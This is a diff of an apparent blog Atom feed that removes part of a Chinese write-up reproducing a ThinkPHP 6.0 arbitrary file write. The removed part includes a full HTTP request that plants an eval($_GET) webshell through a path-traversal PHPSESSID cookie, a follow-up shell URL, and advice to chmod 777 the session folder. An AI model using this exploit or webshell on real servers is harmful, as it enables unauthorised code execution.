-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /index.php?s=index/index&amp;amp;c=%3C?php%20eval($_GET[a]);?%3E HTTP/1.1
-Host: 172.16.70.244:8000
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Connection: close
-Cookie: PHPSESSID=../../../../public/sueisokkk.php
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/eval.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-
-    &lt;p&gt;200之后，在&lt;code class=&quot;highlighter-rouge&quot;&gt;public/&lt;/code&gt;下写入了名为&lt;code class=&quot;highlighter-rouge&quot;&gt;sueisokkk.php&lt;/code&gt;的文件，在浏览器中访问构造带有payload的链接：&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://xxx.xxx.xxx.xxx:8000/sueisokkk.php?a=fwrite(fopen(%22aa.txt%22,%20%22w%22),%22hello,world!%22);
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;就在&lt;code class=&quot;highlighter-rouge&quot;&gt;public/&lt;/code&gt;下写入了名为&lt;code class=&quot;highlighter-rouge&quot;&gt;aa.txt&lt;/code&gt;内容为&lt;code class=&quot;highlighter-rouge&quot;&gt;hello,world&lt;/code&gt;的文件&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;../../assets/blog_pic/20200313_thinkphp6.0/helloworld.png&quot; alt=&quot;avatar&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;😇此时的心情彷佛春天来到&lt;/p&gt;
-
-&lt;h1 id=&quot;其他的坑&quot;&gt;其他的坑&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;💢如果修改了session以后，http://localhost:8000访问之后出错，就要试一下&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo php think run
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;💢如果&lt;code class=&quot;highlighter-rouge&quot;&gt;runtime/session/&lt;/code&gt;下没有生成的session，那就应该是文件夹写的权限不够，我是直接给了777&lt;/p&gt;
-
-    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo chmod 777 /runtime/session/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;所以能任意写入文件getshell的条件还是很苛刻的&lt;/p&gt;</content><author><name>true</name></author><category term="ThinkPHP" /><category term="漏洞复现" /><summary type="html"></summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>true</name></author><category term="fuzz" /><summary type="html"></summary></entry></feed>
